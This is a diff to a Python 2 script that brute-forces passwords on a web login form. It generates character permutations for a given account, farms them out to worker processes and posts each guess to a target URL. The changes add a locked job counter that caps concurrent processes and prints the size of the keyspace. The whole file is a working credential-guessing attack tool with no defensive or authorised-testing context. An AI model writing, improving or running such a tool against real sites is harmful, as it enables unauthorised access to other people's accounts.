@@ -1,10 +1,11 @@
-import itertools, urllib, urllib2, sys, multiprocessing, os, signal, enchant
+import itertools, urllib, urllib2, sys, multiprocessing, os, signal, enchant, time
 
 chunk_size = 50000
 allow_number = True
 allow_uppercase = False
-allow_dict = True
-
+allow_dict = False
+# for thread save
+max_job = 5
 dictstring = 'abcdefghijklmnopqrstuvwxyz_'
 
 if allow_number:
@@ -18,14 +19,19 @@ if allow_uppercase:
 uk = enchant.Dict("en_UK")
 us = enchant.Dict("en_US")
 
-def process(temp,url,form,form1,account):
-    jobs = []
-    p = multiprocessing.Process(target=work, args=(temp,url,form,form1,account,))
-    jobs.append(p)
-    p.start()
+def process(temp,url,form,form1,account,jobs,lock):
+    global max_job
+    while jobs.value >= max_job:
+        print 'Processes is full, sleeping...'
+        time.sleep(5)
+        pass
+    with lock:
+        jobs.value += 1
+    print 'Queue stack in ' + str(jobs.value) + ' jobs.'
+    multiprocessing.Process(target=work, args=(temp,url,form,form1,account,jobs,lock,)).start()
     pass
 
-def brute(i, url = '', form = 'account', form1 = 'password', account = ''):
+def brute(i, url = '', form = 'account', form1 = 'password', account = '', jobs = None, lock = None):
     temp = []
     for l in itertools.permutations(dictstring, i):
         if allow_dict and filter_dict(''.join(l)):
@@ -34,19 +40,18 @@ def brute(i, url = '', form = 'account', form1 = 'password', account = ''):
             temp.append(l)
             pass
         if len(temp) > chunk_size:
-            process(temp,url,form,form1,account)
+            process(temp,url,form,form1,account,jobs,lock)
             del temp[:]
             pass
         pass
 
     if len(temp)>0:
-        process(temp,url,form,form1,account)
+        process(temp,url,form,form1,account,jobs,lock)
         del temp[:]
         pass
     pass
 
 if __name__ == '__main__':
-    jobs = []
     try:
     	account = sys.argv[1]
     	n = int(sys.argv[2])
@@ -70,17 +75,27 @@ if __name__ == '__main__':
     except Exception, e:
     	form1 = 'password'
     	pass
-
+    total = 0
     for i in xrange(n,m+1):
-    	p = multiprocessing.Process(target=brute, args=(i,url,form,form1,account,))
-        jobs.append(p)
-        p.start()
-
-def work(res, url, form, form1, account):
-    for n in res:
-        password = ''.join(n)
-        send(url, form, form1, account, password)
+        total += pow(len(dictstring), i)
         pass
+
+    # start counter
+    jobs = multiprocessing.Value('i', 0)
+    lock = multiprocessing.Lock()
+    print 'Starting with ' + str(total) + ' answer...'
+    del total
+    for i in xrange(n,m+1):
+    	multiprocessing.Process(target=brute, args=(i,url,form,form1,account,jobs,lock,)).start()
+
+def work(res, url, form, form1, account,jobs,lock):
+    for n in res:
+        send(url, form, form1, account, ''.join(n))
+        pass
+    with lock:
+        jobs.value -= 1
+    print 'Child process is left ... ' + str(jobs.value) + ' jobs in stack.' 
+    sys.exit()
     pass
 
 # form => password filed
@@ -107,9 +122,3 @@ def filter_dict(words):
             pass
         pass
     pass
-
-def chunks(l, n):
-    """ Yield successive n-sized chunks from l.
-    """
-    for i in xrange(0, len(l), n):
-        yield l[i:i+n]  
